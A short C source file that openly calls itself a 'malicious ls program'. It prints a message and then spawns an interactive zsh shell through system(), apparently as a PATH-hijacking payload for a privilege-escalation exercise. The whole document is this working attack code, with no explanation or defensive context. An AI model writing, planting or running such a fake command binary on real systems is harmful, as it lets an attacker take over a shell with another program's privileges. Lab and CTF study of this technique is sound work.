#include <stdio.h>
#include <stdlib.h>

int main(){
	printf("My malicious ls program is called!\n");
	system("/bin/zsh");
	return 0;
}